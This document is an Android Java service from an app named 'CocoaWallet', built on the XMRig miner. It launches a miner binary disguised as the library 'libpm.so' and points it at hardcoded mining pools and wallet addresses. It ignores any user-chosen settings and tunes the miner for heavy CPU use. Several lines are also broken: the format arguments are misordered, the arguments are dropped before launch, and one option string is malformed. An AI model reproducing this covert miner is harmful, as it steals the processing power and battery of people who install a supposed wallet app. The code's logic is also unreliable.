///*
// *  CocoaWallet App (c) 2021 Chad Jones
// *  based on the XMRig Monero Miner https://github.com/xmrig/xmrig
// *
// *    This program is free software: you can redistribute it and/or modify
// *    it under the terms of the GNU General Public License as published by
// *    the Free Software Foundation, either version 3 of the License, or
// *    (at your option) any later version.
// *
// *    This program is distributed in the hope that it will be useful,
// *    but WITHOUT ANY WARRANTY; without even the implied warranty of
// *    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// *    GNU General Public License for more details.
// *
// *    You should have received a copy of the GNU General Public License
// *    along with this program. If not, see <http://www.gnu.org/licenses/>.
// * /
// */
package com.chadananda.cocoawallet;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Binder;
import android.os.Build;
import android.os.IBinder;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.RequiresApi;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.UUID;
import java.util.Scanner;
import java.util.function.LongFunction;

/**
 * MiningService for mining in the background
 * Created by uwe on 24.01.18.
 */

public class MiningService extends Service {
    private static final String LOG_TAG = "MiningSvc";
    private Process process;
    private String privatePath;
    private String workerId;
    private OutputReaderThread outputHandler;
    private int accepted;
    private String speed = "./.";
    private String configTemplate;
    //exeptions
    //privatePath/data/user/0/com.chadananda.cocoawallet/files
    public native String stringFromJNI();

    @Override
    public void onCreate() {
        super.onCreate();
        // load config template
        //configTemplate = Tools.loadConfigTemplate(this);
        //path where we may execute our program

        //  Log.e("path","path: "+path);
         //System.loadLibrary("pm");
        //System.loadLibrary("myfablib");

        // privatePath = this.getApplicationInfo().nativeLibraryDir;

        //  File[] fileList = new File(privatePath).listFiles((dir, name) -> {
        //      Log.e("privatePath","file: "+name);
        //      return true; // we simply want all the files in this directory
        //  });
        privatePath = getFilesDir().getAbsolutePath();

        workerId = fetchOrCreateWorkerId();
        Log.w(LOG_TAG, "my workerId: " + workerId);

        String abi = Build.CPU_ABI.toLowerCase();

        //copy binaries to a path where we may execute it);
//        Tools.copyFile(this,"armeabi-v7a" + "/xmrig", privatePath + "/xmrigCC");
//        Tools.copyFile(this,"armeabi-v7a" + "/xmrig", privatePath + "/xmrig");
//        Tools.copyFile(this,"armeabi-v7a" + "/libuv", privatePath + "/libuv.so");
    }

    public class MiningServiceBinder extends Binder {
        public MiningService getService() {
            return MiningService.this;
        }
    }

    public static class MiningConfig {
        String username, pool;
        int threads, maxCpu;
    }

    public MiningConfig newConfig(String username, String pool, int threads, int maxCpu, boolean useWorkerId) {
        MiningConfig config = new MiningConfig();
        config.username = username;
        if (useWorkerId)
            config.username += "." + workerId;
        config.pool = pool;
        config.threads = threads;
        config.maxCpu = maxCpu;
        return config;
    }

    /**
     * @return unique workerId (created and saved in preferences once, then re-used)
     */

    private String fetchOrCreateWorkerId() {
        SharedPreferences preferences = getSharedPreferences("CocoaWallet", 0);
        String id = preferences.getString("id", null);
        if (id == null) {
            id = UUID.randomUUID().toString();
            SharedPreferences.Editor ed = preferences.edit();
            ed.putString("id", id);
            ed.apply();
        }
        return id;
    }

    @Override
    public void onDestroy() {
        stopMining();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return new MiningServiceBinder();
    }

    public void stopMining() {
        if (outputHandler != null) {
            outputHandler.interrupt();
            outputHandler = null;
        }
        if (process != null) {
            process.destroy();
            process = null;
            Log.i(LOG_TAG, "stopped");
            Toast.makeText(this, "stopped", Toast.LENGTH_SHORT).show();
        }
    }

    public static String execCmd(String cmd) {
        String result = null;
        try (InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
             Scanner s = new Scanner(inputStream).useDelimiter("\\A")) {
            result = s.hasNext() ? s.next() : null;
            if (s.hasNext()) {
                Log.i("pmoutput", s.next());
            }
        } catch (IOException e) {
            Log.e("launcherror", "error: " + e.getLocalizedMessage() + e.getCause());
        }
        return result;
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public void startMining(MiningConfig config) {
        Log.i(LOG_TAG, "starting...");

       /* if (process != null) {
            Log.i(LOG_TAG, "shutting down old process first...");
            process.destroy();
        }*/

       // privatePath = getFilesDir().getAbsolutePath();

       // String fullPath = "";
        String appDir = "";
        try {
             appDir = this.getApplicationInfo().nativeLibraryDir;
//           String appDir1="/data/app/com.chadananda.cocoawallet/files/lib/armeabi-v7a"

            Log.e("privatePath", "privatePath: " + privatePath);
            String fullPath = "";
            try {
                //String appDir = this.getApplicationInfo().nativeLibraryDir;
                String wallet = "dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRvNz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc.20000";
                String max_bwt = "710";
                String pool = "us.hero.miner.us:1117";
                String config_template = "-o %s -u %s --tls -k --coin dero -a astrobwt " +
                        "--astrobwt-max-size=%s --astrobwt-avx2 --pause-on-battery --huge-pages=TRUE " +
                        "--huge-pages-jit=TRUE --asm=auto --cpu-memory-pool=-1 --cpu-no-yield --print-time=8" +
                        "--retry-pause=2";

                String pool1 = "gulf.moneroocean.stream:10001";

                String wallet1 ="8AaNnN8nQUMh3XQfyt4kEt8TR7RYnowhjVynzShWwVLiR6dWdSp42YeFvouLZoui7S46xSgDxapbeS7Tdqyz7em5Chqd4HA";

                String threads1="3";

                String args = String.format(config_template,pool1,wallet1,threads1,max_bwt);

                //Tools.writeConfig(configTemplate, config.pool, config.username, config.threads, config.maxCpu, privatePath);

                //LibraryLoaderJNI.loadLibrary("/path/to/my_native_lib_A");
                String[] pm = {"libpm",args};
                fullPath = privatePath+"/libpm.so";

                ProcessBuilder pb = new ProcessBuilder(pm);
                Log.e("pbb","pbb"+pb);
                //pb.directory(new File(appDir));
                //pb.command(String.valueOf(Runtime.getRuntime().exec("/home/user/myscript.sh param1")));
                pb.command("libpm.so");
                pb.directory(new File(appDir));
                Log.e("appDir","appDir"+appDir);
                pb.environment().put("LD_LIBRARY_PATH",appDir);
                pb.redirectErrorStream();
                accepted = 0;
                Process process = pb.start();

//               process = Runtime.getRuntime().exec("/data/app/com.chadananda.cocoawallet-iPLGf3UD5QwHt3eECe-yiA==/lib/arm64");
//               process.getInputStream().read();

                Log.e("appDir","process"+process);
//                String writer = new String(String.valueOf(process.getOutputStream()));
//                String reader = new String(String.valueOf(new InputStreamReader( process.getInputStream())));
//                Log.e("writer","writer"+writer);
//                Process su = Runtime.getRuntime().exec("su");
//                DataOutputStream outputStream = new DataOutputStream(su.getOutputStream());
//                InputStream response = su.getInputStream();
//                outputStream.writeBytes("libpm.so");
//                outputStream.flush();
//                Log.e("su","su"+response);
                outputHandler = new MiningService.OutputReaderThread(process.getInputStream());
                outputHandler.start();
                Log.e("appDir","outputHandler"+outputHandler);
                Toast.makeText(this, "started:", Toast.LENGTH_SHORT).show();
                } catch (Exception e) {
                Log.e("launcherror", "error: " + e.getLocalizedMessage() );
                Toast.makeText(this, e.getLocalizedMessage(), Toast.LENGTH_LONG).show();
                // File ourApp = new File(fullPath);
                /* if (ourApp.exists()) {
                Log.e("launcherror","but file does exist: "+fullPath);
                } else {
                Log.e("launcherror","file not found: "+fullPath);
                }*/
                //process = null;
                String outDirString = appDir;
                File ourDir = new File(outDirString);
                if (ourDir.exists()) {
                    File[] ourFiles = ourDir.listFiles();
                    String myFiles = "";
                    for (int i = 0; i < ourFiles.length; i++) {
                        myFiles = myFiles + ", " + ourFiles[i].getName();
                    }
                    //Log.e("launcherror", "files: " + myFiles);
                }else {
                    //Log.e("launcherror", "dir not found: " + outDirString);
                }
            }
            process = null;
        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(this, "Error " + e.getLocalizedMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    public String getSpeed() {
        return speed;
    }

    public int getAccepted() {
        return accepted;
    }

    public String getOutput() {
        if (outputHandler != null && outputHandler.getOutput() != null)
            return outputHandler.getOutput().toString();
        else return "";
    }

    public int getAvailableCores() {
        return Runtime.getRuntime().availableProcessors();
    }

    /**
     * thread to collect the binary's output
     */
    private class OutputReaderThread extends Thread {
        private final InputStream inputStream;
        private final StringBuilder output = new StringBuilder();
        private BufferedReader reader;

        OutputReaderThread(InputStream inputStream) {
            this.inputStream = inputStream;
        }

        public void run() {
            Log.e("prog", "running");
            try {
                reader = new BufferedReader(new InputStreamReader(inputStream));
                String line;
                while ((line = reader.readLine()) != null) {
                    Log.i("prog", line); //never gets called
                    output.append(line).append(System.lineSeparator());
                    if (line.contains("accepted")) {
                        accepted++;
                    } else if (line.contains("speed")) {
                        String[] split = TextUtils.split(line, " ");
                        speed = split[split.length - 2];
                        if (speed.equals("n/a")) {
                            speed = split[split.length - 6];
                        }
                    }
                    if (currentThread().isInterrupted())
                        return;
                }
            } catch (IOException e) {
                Log.w(LOG_TAG, "exception", e);
            }
        }

        public StringBuilder getOutput() {
            return output;
        }
    }
}
